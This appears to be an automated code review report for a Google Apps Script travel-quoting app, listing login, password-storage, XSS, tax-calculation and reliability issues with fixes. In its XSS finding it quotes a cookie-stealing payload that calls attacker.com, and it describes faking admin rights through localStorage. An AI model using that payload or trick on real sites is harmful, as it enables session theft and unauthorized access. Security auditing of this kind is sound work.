# TripStore Code Review Report
**Date:** 2026-06-10
**Reviewed by:** Automated Daily Review
**Files in scope:** Code.gs, Pipeline.gs, Quote_Intelligence.gs, index_fit.tripstore.html, write_to_sheets.py, archive_to_input.py
**Files requested but NOT FOUND in repo:** extract_itineraries.py, write_inputs_to_sheets.py, cleanup_sheet.py, clean_pipeline_data.py, cross_reference.py, enrich_hotels.py, enrich_hotels_booking.py

---

## SUMMARY

| Severity | Count |
|----------|-------|
| CRITICAL | 3     |
| MODERATE | 10    |
| MINOR    | 9     |
| **TOTAL**| **22**|

---

## CRITICAL ISSUES

### [CRITICAL-1] Login Endpoint Mismatch — Login May Be Broken for New Sessions
**File:** `index_fit.tripstore.html` line 583 vs `Code.gs` lines 43–58

The frontend sends the `checkLogin` action as a **POST** request:
```js
await fetch(API_URL, { method: "POST", body: JSON.stringify({ action: "checkLogin", user, pass }) });
```
But `doPost()` in Code.gs only handles `signup` and `saveItinerary`. There is no `checkLogin` case in `doPost`. The `checkLogin` handler exists only in `doGet()` (which reads URL parameters).

**Result:** Every new login attempt returns `"Invalid action"`, which the frontend treats as `"❌ Invalid Credentials"`. Users already logged in via `localStorage` auto-login still work until they log out — at that point they cannot log back in.

**Fix:** Add a `checkLogin` case to `doPost()` in Code.gs that reads from `data.user` and `data.pass`:
```javascript
if (action === 'checkLogin') {
  return checkLogin(data.user || '', data.pass || '');
}
```
Also remove the GET-based checkLogin from `doGet()` to prevent credentials appearing in server logs.

---

### [CRITICAL-2] Passwords Stored and Compared in Plaintext
**File:** `Code.gs` lines 256–268 (checkLogin), line 289 (handleSignup)

User passwords are stored directly in the Google Sheet in plain text and compared with a simple string equality check. If anyone gains read access to the Sheet (accidental sharing, Google account breach), all credentials are immediately exposed.

```javascript
const dbPass = String(data[i][1]).trim();
if (dbUser === user... && dbPass === pass.trim()) { ... }
sheet.appendRow([username.trim(), password.trim(), 'PENDING', ...]);
```

**Fix:** Hash passwords before storing. Google Apps Script supports:
```javascript
const hash = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, salt + password)
  .map(b => (b < 0 ? b + 256 : b).toString(16).padStart(2, '0')).join('');
```
Store and compare hashes only. Never store the raw password.

---

### [CRITICAL-3] XSS via Unsanitised innerHTML Throughout the App
**File:** `index_fit.tripstore.html` — lines 686, 841, 1390, 1391, 1396, 1445, 1585, 1714, 1821, 1883, 1954, 1993, 2009, 2077, 2112, 2215 (and more)

Data fetched from the Google Sheet backend (hotel names, city names, tour names, pax names loaded from cloud) is injected directly into `innerHTML` without sanitisation. Example:
```js
document.getElementById('cityList').innerHTML = cities.map(c => `<option value="${c}">`).join('');
```
If a malicious entry is added to the Hotels sheet containing `"><img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>`, it executes in every user's browser on page load.

**Fix:** Use `document.createElement` + `textContent` + `appendChild` for all dynamic content, or sanitise strings before injecting:
```js
function escHtml(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
```
Apply `escHtml()` to every sheet-sourced value before placing it inside template literals that go into innerHTML.

---

## MODERATE ISSUES

### [MODERATE-1] GST Always Logged as 5% Regardless of Mode Selected
**Files:** `index_fit.tripstore.html` line 711, `Quote_Intelligence.gs` line 119

The save payload stores GST as a string mode (`gstMode: '5pkg' | '18svc' | 'none'`), but `buildQuoteLogRow` reads:
```javascript
const gstPct = d.gst || 5;
```
`d.gst` is never set in the payload, so it is always `undefined`, defaulting to `5`. The Quote Log records 5% GST for every quote regardless of what the agent selected.

**Fix:** In `buildQuoteLogRow`, derive gstPct from gstMode:
```javascript
const gstPct  = d.gstMode === '18svc' ? 18 : d.gstMode === '5pkg' ? 5 : 0;
const gstBase = d.gstMode === '18svc' ? markupAmt : (subTotal + markupAmt);
const gstAmt  = Math.round(gstBase * gstPct / 100);
```

---

### [MODERATE-2] Infinite Recursion Risk in logQuote
**File:** `Quote_Intelligence.gs` lines 33–47

```javascript
function logQuote(paxName, data) {
  const logSheet = ss.getSheetByName('Quote_Log');
  if (!logSheet) {
    setupQuoteLog();
    return logQuote(paxName, data); // ← infinite loop if setupQuoteLog() fails silently
  }
```
If `setupQuoteLog()` fails (quota exceeded, permissions error) without throwing, `logQuote` calls itself indefinitely until a stack overflow, crashing the save operation.

**Fix:** Add a retry guard:
```javascript
function logQuote(paxName, data, retried = false) {
  const logSheet = ss.getSheetByName('Quote_Log');
  if (!logSheet) {
    if (retried) return;
    setupQuoteLog();
    return logQuote(paxName, data, true);
  }
```

---

### [MODERATE-3] No Execution Time Safeguard — Pipeline Can Timeout Mid-Batch
**File:** `Pipeline.gs` lines 224–253

Apps Script has a 6-minute execution limit. `runMidnightEnrichment` processes all PENDING rows across 4 sheets in one run with no time check. If INPUT sheets accumulate many rows, the script times out mid-batch — some rows get marked PROCESSED, others never run, and the audit log won't record the cutoff point clearly.

**Fix:** Add a deadline check inside the batch loop:
```javascript
const deadline = new Date(start.getTime() + 5 * 60 * 1000);
// ... inside the for-loop:
if (new Date() > deadline) {
  auditLog(ss, 'TIME LIMIT REACHED — stopping. Remaining rows will process next run.');
  break;
}
```

---

### [MODERATE-4] Claude Response Count Not Validated Against Batch Size
**File:** `Pipeline.gs` lines 228–249

If Claude returns fewer items than the batch size (e.g., 3 results for 5 input rows), the missing rows are silently left as PENDING and never retried — they stay in that state forever since the next run's duplicate check won't match them either (they haven't been enriched).

**Fix:** After the API call, for any `batch[idx]` that has no matching result in the array, mark those rows as ERROR with reason "Claude returned incomplete response — will retry after manual reset".

---

### [MODERATE-5] setupSheets() Inserts Duplicate Banner Row on Each Call
**File:** `Pipeline.gs` lines 778–780

`ws.insertRowBefore(2)` runs every time `setupSheets()` is called without checking if the banner already exists. Running it twice inserts two banners and shifts all data rows down, breaking the row-offset assumptions in `getPendingRows` (which skips rows 1 and 2).

**Fix:**
```javascript
const existingBanner = ws.getRange(2, 1).getValue().toString();
if (!existingBanner.startsWith('ℹ️')) ws.insertRowBefore(2);
```

---

### [MODERATE-6] POST Fetch Calls Missing Content-Type Header
**File:** `index_fit.tripstore.html` lines 583, 612, 720, 2288–2291

All POST fetch calls omit `Content-Type: application/json`:
```js
fetch(API_URL, { method: "POST", body: JSON.stringify(data) });
```
Without this header, Apps Script receives the body with an incorrect MIME type. Some deployments fail to parse the body correctly (`e.postData.contents` may be empty).

**Fix:**
```js
fetch(API_URL, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(data)
});
```
Apply to all 4 POST call sites.

---

### [MODERATE-7] isAdmin Stored in localStorage — Privilege Can Be Faked Client-Side
**File:** `index_fit.tripstore.html` lines 641–651

```javascript
isAdmin = s.isAdmin;  // read from localStorage
launchApp(s.modeText);
```
Any user can open DevTools → Application → localStorage, set `isAdmin: true`, and reload. They'll see the full Admin panel and can load any saved itinerary. The server does serve that data without authentication checks (`getAllSaved` has no auth — it's a plain GET request).

**Fix:** Re-validate the user's role on every `init()` call rather than trusting localStorage. Pass a session token to the server and return the authorised role.

---

### [MODERATE-8] parse_transfers_cell City Extraction Is Brittle
**File:** `archive_to_input.py` lines 155–163

City extraction relies on splitting on a hardcoded list of airport-related keywords. Destinations not in the list get their first word used as the city, which produces garbage data (e.g., "Heathrow Airport to London" → city = "Heathrow"). These bad rows are silently queued to INPUT_Transfers where Pipeline.gs later marks them ERROR.

**Fix:** Either pass the city column from the archive row context into the transfer parser, or flag any extracted city shorter than 2 characters as unparseable and skip rather than queue.

---

### [MODERATE-9] backfillQuoteLog Has No Deduplication
**File:** `Quote_Intelligence.gs` lines 278–309

Running `backfillQuoteLog()` more than once appends all historical itineraries again, creating duplicate rows in Quote_Log with different Quote IDs. Analytics (conversion rates, total quotes) become inflated.

**Fix:** Before the forEach loop, build a set of existing paxName values from the current Quote_Log, and skip any already present.

---

### [MODERATE-10] saveItinerary Response Not Checked — Silent Data Loss
**File:** `index_fit.tripstore.html` lines 719–722

```javascript
await fetch(API_URL, { method: "POST", body: JSON.stringify(data) });
showToast("Saved Successfully");
```
The response body is never read. If the backend returns `"Setup Error: Saved_Itineraries sheet not found"` or any other error string, the user still sees a success toast while their data was not saved.

**Fix:**
```javascript
const res = await fetch(API_URL, { method: "POST", headers: {...}, body: JSON.stringify(data) });
const txt = await res.text();
if (!txt.includes('Successfully')) throw new Error(txt);
showToast("Saved Successfully");
```

---

## MINOR ISSUES

### [MINOR-1] Spreadsheet ID Hardcoded in Both Python Scripts
**Files:** `write_to_sheets.py` line 28, `archive_to_input.py` line 32

`SPREADSHEET_ID = "1U3f6PhTpvbEO7JG937t2z9EW9dfB0gcIOUVA_GATIHM"` is hardcoded. Moving to a different sheet requires editing two files.

**Fix:** `import os; SPREADSHEET_ID = os.environ.get("TRIPSTORE_SHEET_ID", "1U3f...")`.

---

### [MINOR-2] Quote ID Collision Risk (8-digit Timestamp Slice)
**File:** `Quote_Intelligence.gs` line 140

`'Q-' + new Date().getTime().toString().slice(-8)` — the last 8 digits of Unix time repeat every ~115 days. Two quotes within the same millisecond share the same ID.

**Fix:** Use full timestamp + random suffix: `'Q-' + Date.now() + '-' + Math.random().toString(36).slice(2,5)`.

---

### [MINOR-3] Deprecated `substr` in _titleCase
**File:** `Quote_Intelligence.gs` line 315

`t.substr(1)` is deprecated. Replace with `t.substring(1)`.

---

### [MINOR-4] CDN Scripts Without Subresource Integrity Hashes
**File:** `index_fit.tripstore.html` lines 7–11

html2canvas, jsPDF, ExcelJS, FileSaver.js are loaded from CDN without SRI `integrity` attributes. A CDN compromise executes arbitrary code in all user sessions.

**Fix:** Add `integrity="sha384-..."` to each `<script>` tag. SRI hashes are available on each library's CDN page.

---

### [MINOR-5] gspread.authorize() Is Deprecated
**Files:** `write_to_sheets.py` line 50, `archive_to_input.py` line 309

`gspread.authorize(creds)` was deprecated in gspread v5. Still works but will break in a future release.

**Fix:** Use `client = gspread.Client(auth=creds)` or `gspread.service_account(filename=CREDENTIALS_PATH)`.

---

### [MINOR-6] GET-Based checkLogin Exposes Credentials in URL (Latent Risk)
**File:** `Code.gs` lines 25–27

The `doGet` handler for `checkLogin` accepts credentials as URL parameters (`?user=...&pass=...`). Though the frontend doesn't use this path currently, it exists and would log credentials in Google's server access logs and browser history if ever called.

**Fix:** Remove the GET-based checkLogin entirely from `doGet`.

---

### [MINOR-7] ws.row_count == 0 Check Is Always False in gspread
**File:** `write_to_sheets.py` line 168

`ws.row_count` in gspread returns the allocated capacity (default 1000), not actual data rows. The check `ws.row_count == 0` is never true, making it dead code. The logic still works because `not ws.get_all_values()` is also checked, but `get_all_values()` is called twice (wasting an API round-trip).

**Fix:** `all_values = ws.get_all_values(); sheet_is_empty = (len(all_values) == 0)`. Use `all_values` directly in `build_existing_keys`.

---

### [MINOR-8] Hotel Parser Silently Drops Last Entry on Malformed Cell
**File:** `archive_to_input.py` line 70

`for i in range(0, len(parts) - 3, 4)` silently drops partial entries when `len(parts) % 4 != 0`. No warning is emitted.

**Fix:** After the loop, log a warning if `len(parts) % 4 != 0`.

---

### [MINOR-9] No Content-Security-Policy
**File:** `index_fit.tripstore.html`

No CSP meta tag or server header exists. Any successful XSS (see CRITICAL-3) runs with full page privileges.

**Fix:** Add a CSP meta tag restricting script sources to known CDNs and blocking inline scripts (or at minimum restrict object-src and base-uri):
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self' https://script.google.com https://cdnjs.cloudflare.com https://cdn.tailwindcss.com https://fonts.googleapis.com 'unsafe-inline'; object-src 'none'; base-uri 'self';">
```

---

## FILES NOT FOUND IN REPOSITORY

The following 7 files were listed for review but do not exist in the repo:

| File | Status |
|------|--------|
| `extract_itineraries.py` | Not found |
| `write_inputs_to_sheets.py` | Not found |
| `cleanup_sheet.py` | Not found |
| `clean_pipeline_data.py` | Not found |
| `cross_reference.py` | Not found |
| `enrich_hotels.py` | Not found |
| `enrich_hotels_booking.py` | Not found |

These likely exist only on the local machine. If they process credentials, booking API keys, or hotel data, they should be added to the repo (with credentials excluded via `.gitignore`) for version control and future review.

---

## ACTION ITEMS — Priority Order

| # | Severity | File | Action |
|---|----------|------|--------|
| 1 | CRITICAL | Code.gs | Add `checkLogin` to `doPost` to fix broken login |
| 2 | CRITICAL | Code.gs | Hash passwords before storing in Users sheet |
| 3 | CRITICAL | index_fit.tripstore.html | Sanitise all sheet-sourced data before innerHTML assignment |
| 4 | MODERATE | Quote_Intelligence.gs | Fix GST calculation to use gstMode not d.gst |
| 5 | MODERATE | Quote_Intelligence.gs | Add recursion guard to logQuote() |
| 6 | MODERATE | Pipeline.gs | Add 5-minute execution deadline to batch loop |
| 7 | MODERATE | Pipeline.gs | Validate Claude response count vs batch size |
| 8 | MODERATE | index_fit.tripstore.html | Add Content-Type header to all fetch POST calls |
| 9 | MODERATE | index_fit.tripstore.html | Check save response before showing success toast |
| 10 | MODERATE | index_fit.tripstore.html | Re-validate role server-side instead of trusting localStorage |
| 11 | MINOR | Both .py files | Move SPREADSHEET_ID to environment variable |
| 12 | MINOR | index_fit.tripstore.html | Add SRI hashes to CDN script tags |
| 13 | — | Repo | Push missing Python scripts to GitHub for coverage |

---

*Report generated automatically — 2026-06-10*
